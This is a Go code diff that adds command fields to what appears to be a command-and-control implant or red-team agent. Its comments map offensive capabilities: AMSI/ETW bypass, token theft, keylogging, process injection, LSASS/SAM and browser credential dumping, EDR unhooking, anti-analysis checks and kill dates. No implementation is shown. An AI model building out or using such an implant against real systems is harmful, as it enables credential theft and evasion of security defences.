@@ -52,6 +52,56 @@ type Command struct {
 	// Level 2 — Timestomping (operation_type: timestomp)
 	TimestompRef  string `json:"timestomp_ref,omitempty"`  // reference file to copy timestamps from
 	TimestompTime string `json:"timestomp_time,omitempty"` // explicit RFC3339 time to set
+
+	// Phase 3 — AMSI/ETW bypass (operation_type: amsi_bypass | etw_bypass)
+	BypassTargetPID uint32 `json:"bypass_target_pid,omitempty"` // 0 = in-process, >0 = remote PID
+
+	// Phase 3 — Token manipulation
+	// operation_type: token_list | token_steal | token_impersonate | token_make | token_revert | token_runas
+	TokenPID    uint32 `json:"token_pid,omitempty"`    // PID to steal token from
+	TokenUser   string `json:"token_user,omitempty"`   // username for make_token
+	TokenDomain string `json:"token_domain,omitempty"` // domain for make_token
+	TokenPass   string `json:"token_pass,omitempty"`   // password for make_token
+	TokenExe    string `json:"token_exe,omitempty"`    // exe to spawn with token (token_runas)
+	TokenArgs   string `json:"token_args,omitempty"`   // args for token_runas
+
+	// Phase 3 — Screenshot (operation_type: screenshot)
+	// No extra fields needed — result is base64 PNG in CommandResult.Output
+
+	// Phase 3 — Keylogger (operation_type: keylog_start | keylog_dump | keylog_stop | keylog_clear)
+	KeylogDuration int `json:"keylog_duration,omitempty"` // seconds to run (0 = run until stop)
+
+	// Phase 4 — Advanced injection
+	// hollow: operation_type=hollow, ProcessPath=target exe
+	// hijack: operation_type=hijack, InjectPID=target PID
+	// stomp: operation_type=stomp, SacrificialDLL + ShellcodeB64
+	// mapinject: operation_type=mapinject, InjectPID=0 for local or >0 remote
+	SacrificialDLL string `json:"sacrificial_dll,omitempty"` // DLL to stomp (stomp only)
+
+	// Phase 5 — Credential access
+	// lsass_dump: operation_type=lsass_dump, DestinationPath=output path
+	// sam_dump:   operation_type=sam_dump, DestinationPath=output dir
+	// browsercreds: operation_type=browsercreds (no extra fields; returns JSON)
+	// clipboard:  operation_type=clipboard_read
+	BrowserType string `json:"browser_type,omitempty"` // chrome|edge|brave|firefox|all
+
+	// Phase 6 — Sleep obfuscation (operation_type: sleep_obf)
+	SleepDuration int `json:"sleep_duration,omitempty"` // seconds
+
+	// Phase 7 — NTDLL unhooking (operation_type: unhook_ntdll)
+
+	// Phase 8 — Hardware breakpoints (operation_type: hwbp_set | hwbp_clear)
+	HWBPAddr     string `json:"hwbp_addr,omitempty"`     // hex address string e.g. "0x7FFE0000"
+	HWBPRegister uint8  `json:"hwbp_register,omitempty"` // 0-3 (DR0-DR3)
+
+	// Phase 9 — BOF execution (operation_type: bof_exec)
+	BOFData    string `json:"bof_data,omitempty"`    // base64-encoded COFF object
+	BOFArgs    string `json:"bof_args,omitempty"`    // base64-encoded packed args
+
+	// Phase 10 — Anti-debug / anti-VM / time gate (operation_type: antidebug | antivm | timegate_set)
+	WorkingHoursStart int    `json:"working_hours_start,omitempty"` // 0-23
+	WorkingHoursEnd   int    `json:"working_hours_end,omitempty"`   // 0-23
+	KillDate          string `json:"kill_date,omitempty"`           // YYYY-MM-DD or RFC3339
 }
 
 // CommandResult represents the result of a command execution
